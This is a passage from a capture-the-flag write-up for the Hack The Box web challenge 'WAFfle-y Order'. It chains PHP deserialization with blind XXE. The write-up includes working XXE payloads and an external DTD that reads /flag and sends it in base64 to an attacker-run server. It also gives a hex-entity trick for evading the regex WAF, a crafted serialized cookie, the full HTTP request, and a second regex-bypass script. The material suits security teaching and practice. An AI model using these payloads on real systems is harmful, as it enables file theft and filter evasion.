</pre></td><td class="rouge-code"><pre><span class="nc">C</span><span class="o">:</span><span class="mi">19</span><span class="o">:</span><span class="s2">"SplDoublyLinkedList"</span><span class="o">:</span><span class="mi">112</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="o">:</span><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"XmlParserModel"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"data"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="s2">"&lt;env&gt;&lt;debug&gt;1&lt;/debug&gt;&lt;/env&gt;"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"h4ck3d"</span><span class="p">;}</span><span class="o">:</span><span class="n">i</span><span class="o">:</span><span class="mi">42</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/WAFfle-y_Order/waffle-y_regex101_1.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/waffle-y_regex101_1.png" alt="" loading="lazy"></a></p>

<h3 id="xml-external-entity-injection"><span class="me-2">XML External Entity Injection</span><a href="#xml-external-entity-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>We know that we can unserialize arbitrary data, but the application does not contain dangerous functions that could allow code execution. What we can do now?</p>

<p>Because the only interesting class we can use is the <code class="language-plaintext highlighter-rouge">XmlParserModel</code>, letâ€™s start analyzing every single line of code.</p>

<p>The regex is constructed in a way that matches any possible XML External Entity attack containing the <code class="language-plaintext highlighter-rouge">SYSTEM</code> o <code class="language-plaintext highlighter-rouge">PUBLIC</code> keyword. This means that code execution canâ€™t be achieved without bypassing this regex, but <strong>why did developers implement this rule?</strong> Probably they were worried that XXE Injection could be exploited, but why there is such control? Where is the flaw?</p>

<blockquote class="bug">
  <p><code class="language-plaintext highlighter-rouge">simplexml_load_string</code> is called using a dangerous parameter that enables entity substitution, facilitating XML External Entity attacks.</p>
</blockquote>

<p>We potentially have a deserialization vulnerability that may allow us to unserialize an <code class="language-plaintext highlighter-rouge">XmlParserModel</code> object vulnerable to XXE. Letâ€™s try it out!</p>

<p>I created a basic XML containing an XML entity that overrides the debug key to any value.</p>

<p><em>.env</em></p>
<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY xxe "asd"&gt;</span> ]&gt;
<span class="nt">&lt;env&gt;</span>
  <span class="nt">&lt;debug&gt;</span>0<span class="nt">&lt;/debug&gt;</span>
  <span class="nt">&lt;debug&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/debug&gt;</span>
<span class="nt">&lt;/env&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this way we can verify if it works, using the creation of the log file in <code class="language-plaintext highlighter-rouge">/tmp</code> as a reference. If the file is created, it means that the entity works, otherwise, it means that the debug value is not overwritten and therefore the code block is not executed.</p>

<p>First, we have to ensure that the log file does not exist, then we can use the same PHP script used before (<em>test-serialize.php</em>) to generate our cookie and finally we can send it to the server.</p>

<p>We can notice that the file was created, meaning that we can use entities and external entities in our exploitation chain.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c"># cat /tmp/orders.log</span>
<span class="o">[</span>07-04-2023] <span class="o">{</span><span class="s2">"table_num"</span>:<span class="s2">"1337"</span>,<span class="s2">"food"</span>:<span class="s2">"WAFfles"</span><span class="o">}</span> by 0xbro
</pre></td></tr></tbody></table></code></div></div>

<p>Unfortunately, the data contained in our XML is not reflected anywhere in the application. This means that we cannot exfiltrate data by reading it through the app, but we must necessarily use OAST <sup id="fnref:oast"><a href="#fn:oast" class="footnote" rel="footnote" role="doc-noteref">7</a></sup> techniques. Using external entities we can force the web application to perform an <strong>HTTP request to our server</strong>, sending us any data we extracted using other entities.</p>

<p>To test it, we can use the same payload as before (<em>test-serialize.php</em>), this time implementing an external entity called â€œblindâ€ to try to contact our server.</p>

<p><em>.env (blind)</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ 
&lt;!ENTITY blind SYSTEM "http://192.168.1.199/test.txt"&gt;</span>
]&gt;
 <span class="nt">&lt;env&gt;</span>
  <span class="nt">&lt;debug&gt;</span><span class="ni">&amp;blind;</span><span class="nt">&lt;/debug&gt;</span>
 <span class="nt">&lt;/env&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
...
172.16.0.2 - - <span class="o">[</span>07/Apr/2023 17:42:19] <span class="s2">"GET /test.txt HTTP/1.0"</span> 404 -
</pre></td></tr></tbody></table></code></div></div>

<p>We received an HTTP request. This means that we can use external entities to send and retrieve data.</p>

<p>To concatenate multiple entities inside the Document Type Definition we can use parameter entities <sup id="fnref:param-ent"><a href="#fn:param-ent" class="footnote" rel="footnote" role="doc-noteref">8</a></sup>, special XML entities that can only be referenced elsewhere within the DTD. They use the â€œ%â€ character before their name but they can be referenced like traditional XML entities. We can place the malicious payload inside an external DTD and then download it using a simple parameter entity.</p>

<p>I created an external DTD named <code class="language-plaintext highlighter-rouge">test.dtd</code> containing the malicious payload and I reference it inside the <code class="language-plaintext highlighter-rouge">.env</code> XML file.</p>

<p><em>test.dtd</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exf SYSTEM 'http://192.168.1.199/?x=%file;'&gt;</span>"&gt;
%eval;
</pre></td></tr></tbody></table></code></div></div>

<p><em>.env (exfiltrate-ext-dtd)</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ 
&lt;!ENTITY % ext SYSTEM "http://192.168.1.199/test.dtd"&gt;</span>
%ext;
%exf;
]&gt;
<span class="nt">&lt;env&gt;</span>
<span class="nt">&lt;debug&gt;</span>1<span class="nt">&lt;/debug&gt;</span>
<span class="nt">&lt;/env&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this way, the application should download the external file, replace the various entity with the corresponding values and finally send to my server a request containing the value of the flag, encoded in base64.</p>

<p>Disabling the <code class="language-plaintext highlighter-rouge">preg_match_all</code>  filter, it works.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
...
172.16.0.2 - - <span class="o">[</span>07/Apr/2023 17:42:19] <span class="s2">"GET /test.dtd HTTP/1.0"</span> 200 -
172.16.0.2 - - <span class="o">[</span>07/Apr/2023 17:42:19] <span class="s2">"GET /?x=fake-flag-for-testing HTTP/1.0"</span> 200 -
</pre></td></tr></tbody></table></code></div></div>

<p>Now we have to find a way to bypass this second regex preventing us to inject malicious external entities.</p>

<h3 id="preg_match_all-waf-bypass"><span class="me-2">preg_match_all WAF bypass</span><a href="#preg_match_all-waf-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Using a site like regex101 we can analyze the regex in detail and see if it matches our payload.</p>

<p><a href="/assets/img/WAFfle-y_Order/waffle-y_regex101_2.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/waffle-y_regex101_2.png" alt="" loading="lazy"></a></p>

<p>Unfortunately, it does, but as we saw from the Portswigger site <sup id="fnref:obf1"><a href="#fn:obf1" class="footnote" rel="footnote" role="doc-noteref">9</a></sup> and also from this other post <sup id="fnref:obf2"><a href="#fn:obf2" class="footnote" rel="footnote" role="doc-noteref">10</a></sup>, we can use <strong>entities inside XML strings</strong> to try to find a workaround for restricted XXE.</p>

<blockquote class="bug">
  <p>The regex is misconfigured and do not consider entities. Using Hex entities it is possible to bypass the regex, include dangerous external entities and exploit the XXE Injection vulnerability.</p>
</blockquote>

<p>To bypass this regex, so, we can implement another XML parameter entity, this time simply containing our encoded payload.</p>

<p><em>.env (obfuscated)</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ 
&lt;!ENTITY % cont "&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#x35;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#x38;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;"&gt;</span>
%cont;
%ext;
%exf;
]&gt;
<span class="nt">&lt;env&gt;</span>
  <span class="nt">&lt;debug&gt;</span>1<span class="nt">&lt;/debug&gt;</span>
<span class="nt">&lt;/env&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>As we can see, the regex does not match anymore, while the exploit is still working.</p>

<p><a href="/assets/img/WAFfle-y_Order/waffle-y_regex101_3.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/waffle-y_regex101_3.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721_1.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721_1.png" alt="WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721" loading="lazy"></a></p>

<h3 id="final-chain"><span class="me-2">Final chain</span><a href="#final-chain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><em>.env</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ 
&lt;!ENTITY % cont "&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2d;&amp;#x75;&amp;#x72;&amp;#x6c;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;"&gt;</span>
%cont;
%ext;
%exf;
]&gt;
<span class="nt">&lt;env&gt;</span>
  <span class="nt">&lt;debug&gt;</span>1<span class="nt">&lt;/debug&gt;</span>
<span class="nt">&lt;/env&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<blockquote>
  <p>The obfuscated line is <code class="language-plaintext highlighter-rouge">&lt;!ENTITY % ext SYSTEM "http://ngrok-url/test.dtd"&gt;</code></p>
</blockquote>

<p><em>test.dtd</em></p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exf SYSTEM 'http://ngrok-url/?x=%file;'&gt;</span>"&gt;
%eval;
</pre></td></tr></tbody></table></code></div></div>

<p><em>Resulting <code class="language-plaintext highlighter-rouge">XmlParserModel</code> object</em></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nv">PHPSESSID</span><span class="o">=</span>QzoxOToiU3BsRG91Ymx5TGlua2VkTGlzdCI6NTA0OntpOjA7Ok86MTQ6IlhtbFBhcnNlck1vZGVsIjoyOntzOjQ6ImRhdGEiO3M6NDE5OiI8IS0tP3htbCB2ZXJzaW9uPSIxLjAiID8tLT4KPCFET0NUWVBFIGZvbyBbIAo8IUVOVElUWSAlIGNvbnQgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY1OyYjeDc4OyYjeDc0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDZlOyYjeDY3OyYjeDcyOyYjeDZmOyYjeDZiOyYjeDJkOyYjeDc1OyYjeDcyOyYjeDZjOyYjeDJmOyYjeDc0OyYjeDY1OyYjeDczOyYjeDc0OyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDNlOyI+CiVjb250OwolZXh0OwolZXhmOwpdPgo8ZW52PgogIDxkZWJ1Zz4xPC9kZWJ1Zz4KPC9lbnY+CiI7czo4OiJ1c2VybmFtZSI7czo2OiJoNGNrM2QiO306aTo0Mjt9

<span class="nb">echo</span> <span class="s1">'QzoxOToiU3BsRG91Ymx5TGlua2VkTGlzdCI6NTA0OntpOjA7Ok86MTQ6IlhtbFBhcnNlck1vZGVsIjoyOntzOjQ6ImRhdGEiO3M6NDE5OiI8IS0tP3htbCB2ZXJzaW9uPSIxLjAiID8tLT4KPCFET0NUWVBFIGZvbyBbIAo8IUVOVElUWSAlIGNvbnQgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY1OyYjeDc4OyYjeDc0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDZlOyYjeDY3OyYjeDcyOyYjeDZmOyYjeDZiOyYjeDJkOyYjeDc1OyYjeDcyOyYjeDZjOyYjeDJmOyYjeDc0OyYjeDY1OyYjeDczOyYjeDc0OyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDNlOyI+CiVjb250OwolZXh0OwolZXhmOwpdPgo8ZW52PgogIDxkZWJ1Zz4xPC9kZWJ1Zz4KPC9lbnY+CiI7czo4OiJ1c2VybmFtZSI7czo2OiJoNGNrM2QiO306aTo0Mjt9'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
C:19:<span class="s2">"SplDoublyLinkedList"</span>:504:<span class="o">{</span>i:0<span class="p">;</span>:O:14:<span class="s2">"XmlParserModel"</span>:2:<span class="o">{</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:419:<span class="s2">"&lt;!--?xml version="</span>1.0<span class="s2">" ?--&gt;
&lt;!DOCTYPE foo [ 
&lt;!ENTITY % cont "</span>&amp;#x3c<span class="p">;</span>&amp;#x21<span class="p">;</span>&amp;#x45<span class="p">;</span>&amp;#x4e<span class="p">;</span>&amp;#x54<span class="p">;</span>&amp;#x49<span class="p">;</span>&amp;#x54<span class="p">;</span>&amp;#x59<span class="p">;</span>&amp;#x20<span class="p">;</span>&amp;#x25<span class="p">;</span>&amp;#x20<span class="p">;</span>&amp;#x65<span class="p">;</span>&amp;#x78<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x20<span class="p">;</span>&amp;#x53<span class="p">;</span>&amp;#x59<span class="p">;</span>&amp;#x53<span class="p">;</span>&amp;#x54<span class="p">;</span>&amp;#x45<span class="p">;</span>&amp;#x4d<span class="p">;</span>&amp;#x20<span class="p">;</span>&amp;#x22<span class="p">;</span>&amp;#x68<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x70<span class="p">;</span>&amp;#x3a<span class="p">;</span>&amp;#x2f<span class="p">;</span>&amp;#x2f<span class="p">;</span>&amp;#x6e<span class="p">;</span>&amp;#x67<span class="p">;</span>&amp;#x72<span class="p">;</span>&amp;#x6f<span class="p">;</span>&amp;#x6b<span class="p">;</span>&amp;#x2d<span class="p">;</span>&amp;#x75<span class="p">;</span>&amp;#x72<span class="p">;</span>&amp;#x6c<span class="p">;</span>&amp;#x2f<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x65<span class="p">;</span>&amp;#x73<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x2e<span class="p">;</span>&amp;#x64<span class="p">;</span>&amp;#x74<span class="p">;</span>&amp;#x64<span class="p">;</span>&amp;#x22<span class="p">;</span>&amp;#x3e<span class="p">;</span><span class="s2">"&gt;
%cont;
%ext;
%exf;
]&gt;
&lt;env&gt;
  &lt;debug&gt;1&lt;/debug&gt;
&lt;/env&gt;
"</span><span class="p">;</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:6:<span class="s2">"h4ck3d"</span><span class="p">;</span><span class="o">}</span>:i:42<span class="p">;</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>HTTP request:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>POST /api/order HTTP/1.1
Host: 157.245.46.51:30974
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 18
Connection: close
Cookie: PHPSESSID=&lt;@base64&gt;C:19:"SplDoublyLinkedList":504:{i:0;:O:14:"XmlParserModel":2:{s:4:"data";s:419:"&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE foo [ 
&lt;!ENTITY % cont "&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2d;&amp;#x75;&amp;#x72;&amp;#x6c;&amp;#x2f;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x3e;"&gt;
%cont;
%ext;
%exf;
]&gt;
&lt;env&gt;
  &lt;debug&gt;1&lt;/debug&gt;
&lt;/env&gt;
";s:8:"username";s:6:"h4ck3d";}:i:42;}&lt;@/base64&gt;
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"food":"WAFfles"}
</pre></td></tr></tbody></table></code></div></div>

<p>Server response:</p>

<p><a href="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721_2.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721_2.png" alt="WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/Challenge/Web/web_waffley_order/exploit]
â””â”€<span class="nv">$ </span><span class="nb">echo </span>SFRCe3doMF9sM3RfdGgzX2VuYzBkMW5nc18wdXQ/Pz93MDBmLi53bzBmLi53MG9mLi5XQUZmbDNzISF9 | <span class="nb">base64</span> <span class="nt">-d</span>
HTB<span class="o">{</span>wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="safe_object-waf-bypass-second-technique"><span class="me-2">safe_object WAF bypass (second technique)</span><a href="#safe_object-waf-bypass-second-technique" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>After having completed the challenge, thanks to SSCx7832 <sup id="fnref:ssc"><a href="#fn:ssc" class="footnote" rel="footnote" role="doc-noteref">11</a></sup> I discovered that also the second bypass technique was working and could be used as well to evade the regex checking for malicious PHP objects.</p>

<blockquote class="bug">
  <p>The regex is misconfigured and match any sequence starting with <code class="language-plaintext highlighter-rouge">;</code>, even if itâ€™s contained inside a string. Using those objects it is possible to bypass the regex and deserialize dangerous objects.</p>
</blockquote>

<p>The following script creates two different objects, one using the bypass mentioned before and one using the standard way.</p>

<p><em>semicolon_bypass.php</em></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">XmlParserModel</span> <span class="p">{</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">array</span> <span class="nv">$env</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="nv">$username</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$serialized_data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">([</span><span class="s2">";O:2:"</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">))]);</span>
<span class="k">echo</span> <span class="nv">$serialized_data</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">([</span><span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">))]);</span>

<span class="k">echo</span> <span class="s1">'PHPSESSID='</span><span class="mf">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$serialized_data</span><span class="p">);</span>
<span class="c1">// a:1:{s:5:";O:2:";O:10:"HelloWorld":0:{}};</span>
<span class="c1">//           ^           ^</span>
<span class="c1">// match   begin        end</span>
<span class="c1">//</span>
<span class="c1">// And since subsequent matches are continued from</span>
<span class="c1">// the end of the last match no further match is found</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Providing both objects to the regex we can notice that the regex is misconfigured and match any sequence starting with <code class="language-plaintext highlighter-rouge">;</code>, even if itâ€™s contained inside a string.</p>

<p><a href="/assets/img/WAFfle-y_Order/waffle-y_regex101_4.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/waffle-y_regex101_4.png" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">;</code> is used inside serialized objects to separate different properties, but the regex applied does not consider that strings may contain those characters, matching the wrong element and thus, opening another parser differential opportunity.</p>

<h2 id="flag"><span class="me-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<blockquote class="success">
  <p><code class="language-plaintext highlighter-rouge">HTB{wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!}</code></p>
</blockquote>

<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:magic">
      <p><a href="https://www.php.net/manual/en/language.oop5.magic.php">https://www.php.net/manual/en/language.oop5.magic.php</a>Â <a href="#fnref:magic" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:construct">
